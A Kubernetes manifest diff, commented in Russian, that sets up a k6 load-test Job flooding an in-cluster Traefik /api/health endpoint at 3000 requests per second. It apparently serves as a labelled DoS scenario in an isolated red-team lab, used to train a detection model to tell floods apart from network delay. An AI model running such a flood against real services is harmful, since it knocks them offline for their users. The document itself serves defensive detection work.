@@ -1,0 +1,61 @@
+# 21 · attack · Флуд-DDoS на API: залповый поток запросов на /api/health через Traefik.
+# ATT&CK: T1499 (Endpoint Denial of Service)
+# Инструмент: k6 (агрессивный профиль, grafana/k6)
+# Ожидаемый след: rps_total взлетает в разы, open_conns копится, lat_p95/req_p99 растут,
+#                 при насыщении — rps_5xx и падение готовности. ВНЕШНЕ похоже на сбой netdelay
+#                 и на легитимный flash-crowd — в этом и различие, которое учит модель.
+# Гипотеза: объёмный флуд отличается от netdelay тем, что RPS РАСТЁТ (а не проседает),
+#           и источник — под из redlab, а не деградация сети.
+#
+# Запускается в ns redlab (egress закрыт, только к Traefik/react-money). Жёсткий потолок —
+# activeDeadlineSeconds; лимиты ресурсов, чтобы не положить узел. Метку прогона ставит labctl.
+apiVersion: v1
+kind: ConfigMap
+metadata:
+  name: attack-flood-k6
+  namespace: redlab
+data:
+  script.js: |
+    import http from 'k6/http';
+    export const options = {
+      scenarios: {
+        flood: {
+          executor: 'constant-arrival-rate',
+          rate: Number(__ENV.RATE || 3000),
+          timeUnit: '1s',
+          duration: __ENV.DURATION || '120s',
+          preAllocatedVUs: 200,
+          maxVUs: 3000,
+        },
+      },
+    };
+    const URL = 'http://traefik.kube-system.svc.cluster.local/api/health';
+    export default function () { http.get(URL, { timeout: '10s' }); }
+---
+apiVersion: batch/v1
+kind: Job
+metadata:
+  name: attack-flood
+  namespace: redlab
+spec:
+  backoffLimit: 0
+  ttlSecondsAfterFinished: 600
+  activeDeadlineSeconds: 150
+  template:
+    spec:
+      restartPolicy: Never
+      containers:
+        - name: k6
+          image: grafana/k6:latest
+          args: ["run", "--quiet", "/scripts/script.js"]
+          env:
+            - {name: RATE, value: "3000"}
+            - {name: DURATION, value: "120s"}
+          resources:
+            requests: {cpu: 200m, memory: 128Mi}
+            limits: {cpu: "1", memory: 512Mi}
+          volumeMounts:
+            - {name: script, mountPath: /scripts}
+      volumes:
+        - name: script
+          configMap: {name: attack-flood-k6}
